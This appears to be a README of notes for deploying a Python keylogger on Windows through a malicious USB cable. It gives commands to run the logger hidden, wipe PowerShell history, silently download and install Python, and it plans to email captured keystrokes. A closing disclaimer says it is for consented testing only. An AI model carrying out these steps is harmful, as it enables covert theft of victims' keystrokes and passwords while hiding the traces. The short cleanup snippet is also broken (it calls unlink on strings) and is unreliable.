# For windows ps

##### Orignal Python Code credit
From https://github.com/ncorbuk/Python-Keylogger

# ----Random Notes----

#### install via cable

#pip install pynput

#pip install pywin32

#pip install requests

#pip install easygui

#run powershell >  pythonw "C:\Path\Path\Path\OMG CABLE STUFF\python keylogger test.py"

#powershell -WindowStyle Hidden
#Remove-Item (Get-PSReadlineOption).HistorySavePath < removes powershell history

# --------------Install python via powershell---------------
#[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

#wget "https://www.python.org/ftp/python/3.8.0/python-3.8.0.exe" -outfile "python-3.8.0.exe"

#.\python-3.8.0.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0

# python keylogging program

##You will need to comment out the prints and exception prints on code if you were to use this for real, as its testing

##i have prints on here that will tell you and let you know what part of the program is going at the time and that it is

##working

#Youtube channel of original creator - https://bit.ly/2U58Lt9

#modified by me

# TO-DO list

### ADD

Set-ExecutionPolicy Default
Set-ExecutionPolicy -scope CurrentUser Default

# -----------------------------------------------------------------

Upload version of python script that just needs email inputted instead of om.g cables or ducky inputting the info into the box

# -----------------------------------------------------------------
Remove all .txt files will add incase internet connection breaks and errors start

import os

import glob

files = glob.glob('/tmp/*.txt')

for f in files:
    try:
        f.unlink()
    except OSError as e:
        print("Error: %s : %s" % (f, e.strerror))
#Insert into else on error
# -----------------------------------------------------------------

Optimize better

# -----------------------------------------------------------------

Do one for other OS's possibly if my attention span doesn't go else where

# -----------------------------------------------------------------
# -----------------------------------------------------------------

### Disclaimer
>These resources are only for testing and academic purposes and can only be used where strict consent has been given. Do not use them for illegal purposes! It is the end user’s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by these tools, programs, scripts and software.
